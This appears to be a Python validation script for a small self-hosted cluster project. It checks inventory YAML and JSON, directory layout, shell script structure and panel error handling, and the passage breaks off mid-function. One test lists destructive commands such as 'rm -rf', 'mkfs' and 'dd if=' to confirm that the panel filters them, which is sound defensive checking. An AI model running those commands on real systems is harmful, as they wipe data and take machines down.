#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OneCloud Cluster 功能验证脚本
模拟检测所有脚本和功能是否可用
不依赖 pyyaml，使用内置解析器验证 YAML
"""

import os
import sys
import json
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any

# ============ 配置 ============
PROJECT_ROOT = Path(__file__).parent
SCRIPTS_DIR = PROJECT_ROOT / "scripts"
NODE_DIRS = {
    "wk-edge-01": PROJECT_ROOT / "node-wk-edge-01",
    "wk-iot-02": PROJECT_ROOT / "node-wk-iot-02",
    "wk-storage-03": PROJECT_ROOT / "node-wk-storage-03",
}
INVENTORY_DIR = PROJECT_ROOT / "inventory"
PANEL_DIR = PROJECT_ROOT / "panel"

# 节点IP映射 —— 从 inventory/nodes.yaml 动态读取, 避免硬编码 (支持用户自定义 IP)
def load_node_ip_map():
    """读取 inventory/nodes.yaml, 返回 {节点名: IP} 映射"""
    mapping = {}
    try:
        with open(INVENTORY_DIR / "nodes.yaml", encoding='utf-8') as f:
            data = simple_yaml_parse(f.read())
        for node in data.get("nodes", []):
            if node.get("name"):
                mapping[node["name"]] = node.get("ip", "")
    except Exception:
        pass
    return mapping

# 兼容旧引用的快捷别名 (调用即返回最新映射)
def NODE_IP_MAP():  # noqa: N802 - 保留旧名, 但现在是函数
    return load_node_ip_map()

# 颜色支持（Windows兼容）
try:
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    HAS_COLOR = True
except:
    HAS_COLOR = False

def color(text, code):
    if HAS_COLOR:
        return f"\033[{code}m{text}\033[0m"
    return text

GREEN = "92"
RED = "91"
YELLOW = "93"
CYAN = "96"

# ============ 简易 YAML 解析器 ============
def simple_yaml_parse(text: str) -> Dict[str, Any]:
    """简易 YAML 解析器，支持本项目使用的 YAML 结构"""
    result = {}
    lines = text.strip().split('\n')
    
    # 处理 nodes.yaml 格式
    if 'nodes:' in text:
        nodes = []
        current_node = None
        in_services = False
        
        for line in lines:
            stripped = line.strip()
            
            # 节点定义开始
            if stripped.startswith('- name:'):
                if current_node:
                    nodes.append(current_node)
                current_node = {'name': stripped.split(':', 1)[1].strip()}
                in_services = False
            
            # 节点属性
            elif current_node and ':' in stripped and not stripped.startswith('#'):
                key, _, value = stripped.partition(':')
                key = key.strip()
                value = value.strip()
                
                # 处理列表值
                if value.startswith('[') and value.endswith(']'):
                    value = [v.strip() for v in value[1:-1].split(',')]
                elif value == '':
                    # 可能是嵌套结构
                    pass
                
                if current_node is not None and not in_services:
                    current_node[key] = value
            
            # services 列表
            if 'services:' in stripped and stripped.startswith('services:'):
                services_str = stripped.split(':', 1)[1].strip()
                if services_str.startswith('[') and services_str.endswith(']'):
                    current_node['services'] = [s.strip() for s in services_str[1:-1].split(',')]
                    in_services = True
        
        if current_node:
            nodes.append(current_node)
        
        result['nodes'] = nodes
        
        # 提取 network 配置
        network = {}
        for line in lines:
            stripped = line.strip()
            if stripped.startswith('lan_subnet:'):
                network['lan_subnet'] = stripped.split(':', 1)[1].strip()
            elif stripped.startswith('wg_subnet:'):
                network['wg_subnet'] = stripped.split(':', 1)[1].strip()
            elif stripped.startswith('gateway:'):
                network['gateway'] = stripped.split(':', 1)[1].strip()
            elif stripped.startswith('domain:'):
                network['domain'] = stripped.split(':', 1)[1].strip()
        
        if network:
            result['network'] = network
    
    # 处理 services.yaml 格式
    if 'services:' in text:
        services = {}
        current_svc = None
        pending_key = None
        pending_is_list = None
        pending_dict = None
        
        def parse_scalar(val: str):
            """解析标量值（布尔、null、字符串）"""
            val = val.strip()
            if val == 'true':
                return True
            elif val == 'false':
                return False
            elif val == 'null' or val == '~' or val == '':
                return None
            # 内联列表
            if val.startswith('[') and val.endswith(']'):
                inner = val[1:-1].strip()
                if inner == '':
                    return []
                return [v.strip().strip('"').strip("'") for v in inner.split(',')]
            # 带引号字符串
            if len(val) >= 2:
                if (val[0] == '"' and val[-1] == '"') or (val[0] == "'" and val[-1] == "'"):
                    return val[1:-1]
            return val
        
        for line in lines:
            stripped = line.strip()
            indent = len(line) - len(line.lstrip())
            
            # 注释或空行
            if not stripped or stripped.startswith('#'):
                continue
            
            # services: 根键 - 跳过
            if indent == 0 and stripped == 'services:':
                continue
            
            # 服务名（缩进2，以冒号结尾，冒号前无其他冒号）
            if 0 < indent <= 2 and stripped.endswith(':') and ':' not in stripped[:-1]:
                svc_name = stripped[:-1]
                current_svc = svc_name
                services[svc_name] = {}
                pending_key = None
                pending_is_list = None
                pending_dict = None
                continue
            
            # 列表项（以 - 开头，缩进大于4）
            if current_svc and stripped.startswith('- ') and indent > 4:
                item_raw = stripped[2:].strip()
                item_value = parse_scalar(item_raw)
                if pending_key is not None and pending_is_list:
                    services[current_svc][pending_key].append(
                        item_value if item_value is not None else item_raw
                    )
                elif pending_key is not None and pending_is_list is None:
                    services[current_svc][pending_key] = [
                        item_value if item_value is not None else item_raw
                    ]
                    pending_is_list = True
                continue
            
            # 嵌套键值对（在 pending 字典下，缩进大于4，有冒号但非列表项）
            if current_svc and pending_dict is not None and indent > 4 and ':' in stripped and not stripped.startswith('-'):
                sub_key, _, sub_val = stripped.partition(':')
                sub_key = sub_key.strip()
                sub_val_parsed = parse_scalar(sub_val)
                if sub_val_parsed is not None:
                    pending_dict[sub_key] = sub_val_parsed
                continue
            
            # 服务属性或嵌套结构开始
            if current_svc and ':' in stripped:
                key, _, raw_value = stripped.partition(':')
                key = key.strip()
                raw_value = raw_value.strip()
                
                clean_val = raw_value
                if len(clean_val) >= 2:
                    if (clean_val[0] == '"' and clean_val[-1] == '"') or (clean_val[0] == "'" and clean_val[-1] == "'"):
                        clean_val = clean_val[1:-1]
                
                if clean_val == '' or clean_val is None:
                    # 空值：后续行决定是列表还是字典
                    pending_key = key
                    pending_is_list = None
                    pending_dict = {}
                    services[current_svc][key] = pending_dict
                else:
                    parsed = parse_scalar(raw_value)
                    services[current_svc][key] = parsed
                    pending_key = None
                    pending_is_list = None
                    pending_dict = None
        
        # 后处理：未填充的空字典转为空列表
        for svc_data in services.values():
            for key, val in list(svc_data.items()):
                if isinstance(val, dict) and len(val) == 0:
                    svc_data[key] = []
        
        result['services'] = services
    
    return result

# ============ 测试结果 ============
TEST_RESULTS = []
PASSED = 0
FAILED = 0
WARNINGS = 0

def log_pass(name: str, detail: str = ""):
    global PASSED
    PASSED += 1
    msg = f"  [PASS] {name}"
    if detail:
        msg += f" - {detail}"
    TEST_RESULTS.append(("PASS", name, detail))
    print(color(msg, GREEN))

def log_fail(name: str, detail: str = ""):
    global FAILED
    FAILED += 1
    msg = f"  [FAIL] {name}"
    if detail:
        msg += f" - {detail}"
    TEST_RESULTS.append(("FAIL", name, detail))
    print(color(msg, RED))

def log_warn(name: str, detail: str = ""):
    global WARNINGS
    WARNINGS += 1
    msg = f"  [WARN] {name}"
    if detail:
        msg += f" - {detail}"
    TEST_RESULTS.append(("WARN", name, detail))
    print(color(msg, YELLOW))

def log_info(msg: str):
    print(color(f"  [INFO] {msg}", CYAN))

# ============ 测试1: 配置文件完整性验证 ============
def test_config_files():
    """验证 YAML 和 JSON 配置文件"""
    print("\n" + "="*60)
    print("测试 1: 配置文件完整性验证")
    print("="*60)
    
    # 测试 nodes.yaml
    nodes_file = INVENTORY_DIR / "nodes.yaml"
    if not nodes_file.exists():
        log_fail("nodes.yaml 不存在")
        return False
    
    try:
        with open(nodes_file, encoding='utf-8') as f:
            nodes_text = f.read()
        
        nodes_data = simple_yaml_parse(nodes_text)
        
        if "nodes" not in nodes_data:
            log_fail("nodes.yaml 缺少 'nodes' 键")
            return False
        
        nodes = nodes_data["nodes"]
        log_pass(f"nodes.yaml 解析成功: {len(nodes)} 个节点")
        
        # 验证每个节点
        for node in nodes:
            name = node.get("name", "unknown")
            ip = node.get("ip", "")
            wg_ip = node.get("wg_ip", "")
            
            # 检查必要字段
            if not ip:
                log_fail(f"节点 {name} 缺少 IP 地址")
            elif not re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
                log_fail(f"节点 {name} IP 格式错误: {ip}")
            else:
                log_pass(f"节点 {name} IP 验证: {ip}")
            
            if not wg_ip:
                log_warn(f"节点 {name} 缺少 WireGuard IP")
            elif not re.match(r'^\d+\.\d+\.\d+\.\d+$', wg_ip):
                log_fail(f"节点 {name} WireGuard IP 格式错误: {wg_ip}")
            else:
                log_pass(f"节点 {name} WireGuard IP: {wg_ip}")
            
            # 验证 IP 映射一致性
            if name in NODE_IP_MAP():
                expected_ip = NODE_IP_MAP()[name]
                if ip == expected_ip:
                    log_pass(f"节点 {name} IP 与硬编码 fallback 一致")
                else:
                    log_warn(f"节点 {name} IP ({ip}) 与硬编码 fallback ({expected_ip}) 不一致")
        
        # 验证 network 配置
        if "network" in nodes_data:
            network = nodes_data["network"]
            if "lan_subnet" in network:
                log_pass(f"LAN 子网配置: {network['lan_subnet']}")
            if "wg_subnet" in network:
                log_pass(f"WireGuard 子网配置: {network['wg_subnet']}")
            if "gateway" in network:
                log_pass(f"网关配置: {network['gateway']}")
        
    except Exception as e:
        log_fail(f"nodes.yaml 解析错误: {str(e)}")
        return False
    
    # 测试 services.yaml
    services_file = INVENTORY_DIR / "services.yaml"
    if not services_file.exists():
        log_fail("services.yaml 不存在")
        return False
    
    try:
        with open(services_file, encoding='utf-8') as f:
            services_text = f.read()
        
        services_data = simple_yaml_parse(services_text)
        
        if "services" not in services_data:
            log_fail("services.yaml 缺少 'services' 键")
            return False
        
        services = services_data["services"]
        log_pass(f"services.yaml 解析成功: {len(services)} 个服务")
        
        # 验证服务定义
        for svc_name, svc_config in services.items():
            node = svc_config.get("node", "")
            if not node:
                log_fail(f"服务 {svc_name} 缺少 node 字段")
            elif node not in NODE_IP_MAP():
                log_warn(f"服务 {svc_name} 绑定到未知节点: {node}")
            else:
                log_pass(f"服务 {svc_name} 绑定到节点: {node}")
            
            # 验证服务类型
            is_container = svc_config.get("container", False)
            if is_container:
                image = svc_config.get("image", "")
                if image:
                    log_pass(f"服务 {svc_name} 镜像: {image}")
                else:
                    log_fail(f"容器服务 {svc_name} 缺少 image 字段")
        
    except Exception as e:
        log_fail(f"services.yaml 解析错误: {str(e)}")
        return False
    
    # 测试 panel/config.json
    panel_config = PANEL_DIR / "config.json"
    if not panel_config.exists():
        log_fail("panel/config.json 不存在")
        return False
    
    try:
        with open(panel_config, encoding='utf-8') as f:
            panel_data = json.load(f)
        
        if "nodes" not in panel_data:
            log_fail("panel/config.json 缺少 'nodes' 键")
        else:
            log_pass(f"panel/config.json 解析成功: {len(panel_data['nodes'])} 个节点")
        
        # 验证面板节点与 inventory 节点一致性
        panel_node_names = {n["name"] for n in panel_data.get("nodes", [])}
        inv_node_names = set(NODE_IP_MAP().keys())
        
        missing_in_panel = inv_node_names - panel_node_names
        extra_in_panel = panel_node_names - inv_node_names
        
        if not missing_in_panel and not extra_in_panel:
            log_pass("面板节点列表与 inventory 完全一致")
        else:
            if missing_in_panel:
                log_warn(f"面板缺少节点: {missing_in_panel}")
            if extra_in_panel:
                log_warn(f"面板多出节点: {extra_in_panel}")
        
        # 验证面板节点服务配置
        for node in panel_data.get("nodes", []):
            node_name = node.get("name", "")
            services = node.get("services", [])
            if not services:
                log_warn(f"面板节点 {node_name} 没有配置服务")
            else:
                log_pass(f"面板节点 {node_name}: {len(services)} 个服务")
                
                # 检查服务必要字段
                for svc in services:
                    if "name" not in svc:
                        log_fail(f"面板节点 {node_name} 服务缺少 'name' 字段")
                    if "display" not in svc:
                        log_warn(f"面板节点 {node_name} 服务 {svc.get('name', '?')} 缺少 'display' 字段")
                    if "container" not in svc:
                        log_warn(f"面板节点 {node_name} 服务 {svc.get('name', '?')} 缺少 'container' 字段")
        
    except json.JSONDecodeError as e:
        log_fail(f"panel/config.json JSON 解析错误: {str(e)}")
        return False
    except Exception as e:
        log_fail(f"panel/config.json 读取错误: {str(e)}")
        return False
    
    return True

# ============ 测试2: 节点目录结构验证 ============
def test_node_directories():
    """验证节点目录结构"""
    print("\n" + "="*60)
    print("测试 2: 节点目录结构验证")
    print("="*60)
    
    for node_name, node_dir in NODE_DIRS.items():
        log_info(f"检查节点 {node_name}...")
        
        # 检查目录存在
        if not node_dir.exists():
            log_fail(f"节点目录不存在: {node_dir}")
            continue
        
        log_pass(f"节点目录存在: {node_dir}")
        
        # 检查 docker-compose.yml
        compose_file = node_dir / "docker-compose.yml"
        if compose_file.exists():
            try:
                with open(compose_file, encoding='utf-8') as f:
                    compose_text = f.read()
                
                # 检查基本格式
                if 'services:' in compose_text:
                    log_pass(f"{node_name}/docker-compose.yml 包含 services 定义")
                else:
                    log_warn(f"{node_name}/docker-compose.yml 可能缺少 services")
                
                # 检查 volumes 路径
                volumes = re.findall(r'-\s*(\./[^:\s]+):', compose_text)
                if volumes:
                    log_info(f"  卷挂载: {len(volumes)} 个使用相对路径")
                
                # 检查服务数量
                svc_count = len(re.findall(r'^\w[\w-]*:\s*$', compose_text, re.MULTILINE))
                if svc_count > 0:
                    log_pass(f"{node_name} docker-compose: 约 {svc_count} 个服务")
                    
            except Exception as e:
                log_fail(f"{node_name}/docker-compose.yml 错误: {str(e)}")
        else:
            log_warn(f"{node_name} 缺少 docker-compose.yml")
        
        # 检查 .env.example
        env_example = node_dir / ".env.example"
        if env_example.exists():
            log_pass(f"{node_name}/.env.example 存在")
        else:
            log_warn(f"{node_name} 缺少 .env.example")
        
        # 检查服务子目录
        subdirs = [d for d in node_dir.iterdir() if d.is_dir()]
        log_info(f"  子目录: {len(subdirs)} 个")
        for subdir in sorted(subdirs):
            # 检查子目录是否有 init/install 脚本
            init_scripts = list(subdir.glob("init.sh")) + list(subdir.glob("install*.sh"))
            if init_scripts:
                log_pass(f"  服务 {subdir.name}: {len(init_scripts)} 个初始化脚本")
    
    return True

# ============ 测试3: 脚本语法检查 ============
def test_script_syntax():
    """检查脚本语法"""
    print("\n" + "="*60)
    print("测试 3: 脚本语法检查")
    print("="*60)
    
    # 检查 Shell 脚本
    shell_scripts = sorted(SCRIPTS_DIR.glob("*.sh"))
    log_info(f"发现 {len(shell_scripts)} 个 Shell 脚本")
    
    for script in shell_scripts:
        try:
            with open(script, encoding='utf-8') as f:
                content = f.read()

            # 仅被 source 的库文件 (lib-*.sh) 不按可执行脚本的标准要求:
            #   - 不得 set -e: 会让调用方在任何一条命令失败时直接中止 (语义污染)。
            #     注意 set -u (nounset) 是允许的 —— 本项目的 lib-nodes.sh 正是靠它
            #     给 backup.sh / deploy.sh 等「只设了 set -e」的脚本补上 nounset。
            #   - 不要求定义 log_*: 各调用方命名不同 (log_err / log_error),
            #     init.sh 还会在 source 之后覆盖同名函数。
            is_lib = script.name.startswith("lib-")

            # 检查 shebang
            if content.startswith("#!/bin/bash") or content.startswith("#!/bin/sh"):
                log_pass(f"{script.name} 有 shebang")
            else:
                log_warn(f"{script.name} 缺少 shebang")

            if is_lib:
                if re.search(r'^set -[a-z]*e', content, re.MULTILINE):
                    log_fail(f"{script.name} 作为被 source 的库设置了 set -e",
                             "会污染调用方的错误处理语义")
                else:
                    log_pass(f"{script.name} 作为被 source 的库不设置 set -e")
            else:
                # 检查 set -e 或 set -u
                if "set -e" in content or "set -u" in content:
                    log_pass(f"{script.name} 有错误处理 (set -e/-u)")
                else:
                    log_warn(f"{script.name} 缺少 set -e/-u")

                # 检查 log 函数
                has_log_info = "log_info" in content
                has_log_error = "log_error" in content
                if has_log_info and has_log_error:
                    log_pass(f"{script.name} 有日志函数")
                elif not has_log_info:
                    log_warn(f"{script.name} 缺少 log_info 函数")
                elif not has_log_error:
                    log_warn(f"{script.name} 缺少 log_error 函数")

            # 检查基本结构
            functions = re.findall(r'^(\w+)\(\)\s*\{', content, re.MULTILINE)
            if functions:
                log_info(f"  函数: {', '.join(functions[:10])}{'...' if len(functions) > 10 else ''}")

        except Exception as e:
            log_fail(f"{script.name} 读取错误: {str(e)}")
    
    # 检查 Python 脚本
    python_scripts = list(PROJECT_ROOT.glob("**/*.py"))
    python_scripts = [s for s in python_scripts if '.git' not in str(s) and '__pycache__' not in str(s)]
    
    log_info(f"发现 {len(python_scripts)} 个 Python 脚本")
    
    for script in python_scripts:
        try:
            with open(script, encoding='utf-8') as f:
                content = f.read()
            
            # 检查 shebang
            if content.startswith("#!/usr/bin/env python") or content.startswith("#!/usr/bin/python"):
                log_pass(f"{script.name} 有 shebang")
            
            # Python 使用缩进而非大括号，跳过括号配对检查
            
            # 检查必要 import
            imports = re.findall(r'^import (\w+)|^from (\w+) import', content, re.MULTILINE)
            if imports:
                module_names = [i[0] or i[1] for i in imports[:5]]
                log_info(f"  导入: {', '.join(module_names)}")
                
        except Exception as e:
            log_fail(f"{script.name} 读取错误: {str(e)}")
    
    return True

# ============ 测试4: deploy.sh 节点映射验证 ============
def test_deploy_node_mapping():
    """验证 deploy.sh 节点目录映射"""
    print("\n" + "="*60)
    print("测试 4: deploy.sh 节点映射验证")
    print("="*60)
    
    deploy_script = SCRIPTS_DIR / "deploy.sh"
    if not deploy_script.exists():
        log_fail("deploy.sh 不存在")
        return False
    
    try:
        with open(deploy_script, encoding='utf-8') as f:
            content = f.read()
        
        # 解析 NODES 数组
        nodes_pattern = r'NODES=\((.*?)\)'
        nodes_match = re.search(nodes_pattern, content, re.DOTALL)
        if not nodes_match:
            log_fail("无法解析 NODES 数组")
            return False
        
        nodes_block = nodes_match.group(1)
        node_entries = re.findall(r'"([^"]+)"', nodes_block)
        
        log_info(f"deploy.sh 中定义的节点:")
        for entry in node_entries:
            parts = entry.split("|")
            if len(parts) >= 3:
                name, ip, suffix = parts[0], parts[1], parts[2]
                log_info(f"  {name} | {ip} | {suffix}")
                
                # 验证目录后缀与节点名一致
                if suffix == name:
                    log_pass(f"节点 {name} 目录后缀 '{suffix}' 与节点名一致")
                else:
                    log_fail(f"节点 {name} 目录后缀 '{suffix}' 与节点名 '{name}' 不一致")
                
                # 验证目录存在
                node_dir = PROJECT_ROOT / f"node-{suffix}"
                if node_dir.exists():
                    log_pass(f"节点 {name} 对应目录存在: node-{suffix}")
                else:
                    log_fail(f"节点 {name} 对应目录不存在: node-{suffix}")
        
        # 验证与 inventory 一致性
        log_info("与 inventory 验证一致性:")
        for entry in node_entries:
            parts = entry.split("|")
            if len(parts) >= 3:
                name, ip = parts[0], parts[1]
                expected_ip = NODE_IP_MAP().get(name, "")
                
                if expected_ip and ip == expected_ip:
                    log_pass(f"节点 {name} IP {ip} 与 inventory 一致")
                elif expected_ip:
                    log_warn(f"节点 {name} IP {ip} 与 inventory {expected_ip} 不一致")
    
    except Exception as e:
        log_fail(f"deploy.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试5: restore.sh 和 backup.sh fallback 机制 ============
def test_fallback_mechanism():
    """验证 restore.sh 和 backup.sh 的 fallback 机制"""
    print("\n" + "="*60)
    print("测试 5: restore.sh 和 backup.sh fallback 机制")
    print("="*60)
    
    for script_name in ["restore.sh", "backup.sh"]:
        script_path = SCRIPTS_DIR / script_name
        if not script_path.exists():
            log_fail(f"{script_name} 不存在")
            continue
        
        try:
            with open(script_path, encoding='utf-8') as f:
                content = f.read()
            
            # 新设计: 节点 IP 应来自 inventory/nodes.yaml (经 lib-nodes.sh),
            # 脚本内不得写死旧文档里的 192.168.1.10x 地址 (用户要求 IP 可自定义)
            uses_lib = ("lib-nodes.sh" in content) or ("source " in content and "lib" in content)
            hardcoded_hits = re.findall(r'192\.168\.1\.10[0-9]', content)
            uses_node_func = ("node_ip" in content) or ("node_resolve" in content) or ("node_by_ip" in content)

            if uses_lib:
                log_pass(f"{script_name} 引用 lib-nodes.sh (IP 从清单动态读取)")
            else:
                log_warn(f"{script_name} 未发现 lib-nodes.sh 引用, 请确认节点解析来源")

            if not hardcoded_hits:
                log_pass(f"{script_name} 无硬编码节点 IP (符合自定义要求)")
            else:
                log_fail(f"{script_name} 仍硬编码 IP: {sorted(set(hardcoded_hits))}")

            if uses_node_func:
                log_pass(f"{script_name} 使用 node_* 函数解析节点")
            else:
                log_warn(f"{script_name} 未发现 node_* 节点解析调用")
                
        except Exception as e:
            log_fail(f"{script_name} 解析错误: {str(e)}")
    
    return True

# ============ 测试6: health-check.sh 变量声明 ============
def test_health_check_variables():
    """验证 health-check.sh 变量声明位置"""
    print("\n" + "="*60)
    print("测试 6: health-check.sh 变量声明验证")
    print("="*60)
    
    health_script = SCRIPTS_DIR / "health-check.sh"
    if not health_script.exists():
        log_fail("health-check.sh 不存在")
        return False
    
    try:
        with open(health_script, encoding='utf-8') as f:
            content = f.read()
            lines = content.split('\n')
        
        # 检查在函数外使用 local 关键字
        # 先找到所有函数定义的行号范围
        function_ranges = []
        in_function = False
        func_start = 0
        brace_count = 0
        
        for i, line in enumerate(lines, 1):
            if not in_function and re.match(r'^\w+\(\)\s*\{', line):
                in_function = True
                func_start = i
                brace_count = 0
            elif in_function:
                brace_count += line.count('{')
                brace_count -= line.count('}')
                if brace_count <= 0:
                    function_ranges.append((func_start, i))
                    in_function = False
        
        # 检查 local 变量声明
        issues_found = False
        for i, line in enumerate(lines, 1):
            if 'local ' in line and not line.strip().startswith('#'):
                # 检查是否在函数内
                in_any_function = any(start <= i <= end for start, end in function_ranges)
                if not in_any_function:
                    # 检查这是否是变量声明部分（WireGuard/Syncthing 状态检查）
                    context_start = max(0, i - 5)
                    context = '\n'.join(lines[context_start:i])
                    
                    if 'WireGuard' in context or 'Syncthing' in context:
                        log_warn(f"health-check.sh 第 {i} 行: local 变量在函数外声明 - {line.strip()[:60]}")
                        issues_found = True
        
        if not issues_found:
            log_pass("health-check.sh 没有在函数外使用 local 关键字")
        else:
            log_fail("health-check.sh 存在 local 变量在函数外声明的问题")
        
        # 验证 WireGuard 检查变量
        wg_section = re.search(
            r'# ---- WireGuard Mesh ----.*?(?=# ----|\Z)',
            content, re.DOTALL
        )
        if wg_section:
            section = wg_section.group(0)
            peers_match = re.search(r'^peers=', section, re.MULTILINE)
            if peers_match:
                peers_line = peers_match.start()
                wg_line_context = section[:peers_line].split('\n')[-2] if peers_line > 0 else ""
                if 'local ' in wg_line_context:
                    log_fail("WireGuard 检查的 peers 变量前有 local 关键字")
                else:
                    log_pass("WireGuard 检查的 peers 变量声明正确")
        
        # 验证 Syncthing 检查变量
        st_section = re.search(
            r'# ---- Syncthing.*?(?=\Z)',
            content, re.DOTALL
        )
        if st_section:
            section = st_section.group(0)
            st_match = re.search(r'^st_devices=', section, re.MULTILINE)
            if st_match:
                st_line = st_match.start()
                st_line_context = section[:st_line].split('\n')[-2] if st_line > 0 else ""
                if 'local ' in st_line_context:
                    log_fail("Syncthing 检查的 st_devices 变量前有 local 关键字")
                else:
                    log_pass("Syncthing 检查的 st_devices 变量声明正确")
    
    except Exception as e:
        log_fail(f"health-check.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试7: setup.sh cloudflared 命令 ============
def test_cloudflared_command():
    """验证 setup.sh cloudflared 命令"""
    print("\n" + "="*60)
    print("测试 7: setup.sh cloudflared 命令验证")
    print("="*60)
    
    setup_script = SCRIPTS_DIR / "setup.sh"
    if not setup_script.exists():
        log_fail("setup.sh 不存在")
        return False
    
    try:
        with open(setup_script, encoding='utf-8') as f:
            content = f.read()
        
        # 查找 install_cloudflared 函数
        cf_func = re.search(
            r'install_cloudflared\(\)\s*\{(.*?)\n\}',
            content, re.DOTALL
        )
        if not cf_func:
            log_fail("无法找到 install_cloudflared 函数")
            return False
        
        func_body = cf_func.group(1)
        
        # 检查有 token 的命令
        if 'cloudflare/cloudflared:latest tunnel --no-autoupdate run --token' in func_body:
            log_pass("有 token 时 cloudflared 命令包含 'run --token'")
        else:
            log_fail("有 token 时 cloudflared 命令可能缺少 'run'")
        
        # 检查无 token 的命令
        if re.search(r'cloudflare/cloudflared:latest tunnel --no-autoupdate run\s*$', func_body, re.MULTILINE):
            log_pass("无 token 时 cloudflared 命令包含 'run'")
        elif 'cloudflared:latest tunnel --no-autoupdate run' in func_body:
            log_pass("无 token 时 cloudflared 命令包含 'run' 参数")
        else:
            log_fail("无 token 时 cloudflared 命令缺少 'run' 参数")
        
        # 检查 install_panel 函数
        panel_func = re.search(
            r'install_panel\(\)\s*\{(.*?)\n\}',
            content, re.DOTALL
        )
        if panel_func:
            panel_body = panel_func.group(1)
            
            # 检查是否有从项目复制面板的逻辑
            if 'project_panel' in panel_body:
                log_pass("install_panel 包含从项目复制面板的逻辑")
            
            if 'cp -r' in panel_body:
                log_pass("install_panel 有 cp -r 复制操作")
            
            # 检查 fallback 逻辑
            if 'else' in panel_body:
                log_pass("install_panel 有 fallback 逻辑")
            
            # 检查最小面板生成
            if 'PYEOF' in panel_body or 'app.py' in panel_body:
                log_pass("install_panel 能生成最小面板应用")
    
    except Exception as e:
        log_fail(f"setup.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试8: panel/app.py load_config 错误处理 ============
def test_panel_app_error_handling():
    """验证 panel/app.py 错误处理"""
    print("\n" + "="*60)
    print("测试 8: panel/app.py 错误处理验证")
    print("="*60)
    
    app_file = PANEL_DIR / "app.py"
    if not app_file.exists():
        log_fail("panel/app.py 不存在")
        return False
    
    try:
        with open(app_file, encoding='utf-8') as f:
            content = f.read()
        
        # 检查 load_config 函数
        load_config = re.search(
            r'def load_config\(\):(.*?)(?=\ndef|\Z)',
            content, re.DOTALL
        )
        if not load_config:
            log_fail("找不到 load_config 函数")
            return False
        
        func_body = load_config.group(1)
        
        # 检查 try-except
        if 'try:' in func_body and 'except' in func_body:
            log_pass("load_config 有 try-except 块")
        else:
            log_fail("load_config 缺少 try-except 错误处理")
        
        # 检查 FileNotFoundError 处理
        if 'FileNotFoundError' in func_body:
            log_pass("load_config 处理 FileNotFoundError")
        
        # 检查 JSONDecodeError 处理
        if 'JSONDecodeError' in func_body:
            log_pass("load_config 处理 JSONDecodeError")
        
        # 检查默认返回值
        if 'cluster_name' in func_body and 'nodes' in func_body:
            log_pass("load_config 有默认返回值")
        
        # 验证默认值结构
        default_match = re.search(r'"cluster_name":\s*"([^"]*)"', func_body)
        if default_match:
            cluster_name = default_match.group(1)
            log_pass(f"默认集群名称: {cluster_name}")
        
        # 验证 CONFIG_PATH 使用环境变量
        config_env = re.search(
            r'CONFIG_PATH\s*=.*os\.environ\.get\("PANEL_CONFIG"',
            content
        )
        if config_env:
            log_pass("CONFIG_PATH 支持环境变量 PANEL_CONFIG")
        else:
            log_warn("CONFIG_PATH 可能不支持环境变量")
        
        # 检查 run_ssh 函数
        if 'def run_ssh' in content:
            log_pass("有 run_ssh 函数")
        
        # 检查异常处理
        if 'except subprocess.TimeoutExpired' in content:
            log_pass("run_ssh 处理 TimeoutExpired 异常")
        
        if 'except Exception as e' in content:
            log_pass("run_ssh 处理通用异常")
        
        # 检查危险命令过滤
        dangerous_keywords = ['rm -rf', 'mkfs', 'dd if=', 'shutdown', 'reboot', 'poweroff']
        dangerous_found = [kw for kw in dangerous_keywords if kw in content]
        if dangerous_found:
            log_info(f"  危险命令过滤关键字: {dangerous_found}")
        
        if 'dangerous' in content.lower() and 'for d in dangerous' in content:
            log_pass("exec_command 有危险命令过滤")
    
    except Exception as e:
        log_fail(f"panel/app.py 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试9: install-services.sh xiaomusic 下载 ============
def test_xiaomusic_download():
    """验证 install-services.sh xiaomusic 下载逻辑"""
    print("\n" + "="*60)
    print("测试 9: install-services.sh xiaomusic 下载验证")
    print("="*60)
    
    script = SCRIPTS_DIR / "install-services.sh"
    if not script.exists():
        log_fail("install-services.sh 不存在")
        return False
    
    try:
        with open(script, encoding='utf-8') as f:
            content = f.read()
        
        # 查找 install_xiaomusic 函数
        func_match = re.search(
            r'install_xiaomusic\(\)\s*\{(.*?)\n\}',
            content, re.DOTALL
        )
        if not func_match:
            log_fail("找不到 install_xiaomusic 函数")
            return False
        
        func_body = func_match.group(1)
        
        # 检查架构检测
        if 'aarch64|arm64' in func_body:
            log_pass("检测 aarch64/arm64 架构")
        
        if 'x86_64' in func_body:
            log_pass("检测 x86_64 架构")
        
        # 检查默认架构
        if 'arch="armv7"' in func_body or 'arch = "armv7"' in func_body:
            log_pass("默认架构为 armv7")
        
        # 检查下载 URL 过滤
        if 'browser_download_url' in func_body:
            log_pass("使用 browser_download_url 过滤下载链接")
        
        if 'grep.*linux' in func_body or re.search(r'grep.*linux.*arch', func_body):
            log_pass("下载 URL 按架构过滤")
        
        # 检查解压逻辑
        if 'tar xzf' in func_body:
            log_pass("使用 tar xzf 解压")
        
        # 检查临时目录
        if 'mktemp -d' in func_body:
            log_pass("使用 mktemp 创建临时目录")
    
    except Exception as e:
        log_fail(f"install-services.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试10: panel/install-service.sh 路径变量化 ============
def test_panel_install_service():
    """验证 panel/install-service.sh 路径变量化"""
    print("\n" + "="*60)
    print("测试 10: panel/install-service.sh 路径验证")
    print("="*60)
    
    script = PANEL_DIR / "install-service.sh"
    if not script.exists():
        log_fail("panel/install-service.sh 不存在")
        return False
    
    try:
        with open(script, encoding='utf-8') as f:
            content = f.read()
        
        # 检查是否使用变量
        if 'PANEL_DIR=' in content:
            log_pass("使用 PANEL_DIR 变量")
        
        # 检查动态路径计算
        if 'dirname' in content:
            log_pass("动态计算路径（使用 dirname）")
        else:
            log_warn("可能使用硬编码路径")
        
        # 检查是否有硬编码路径
        hardcoded_patterns = [
            r'/mnt/sd/edge-01/panel',
            r'/mnt/sd/wk-edge/panel',
            r'/opt/onecloud/panel',
        ]
        has_hardcoded = False
        for pattern in hardcoded_patterns:
            if re.search(pattern, content):
                has_hardcoded = True
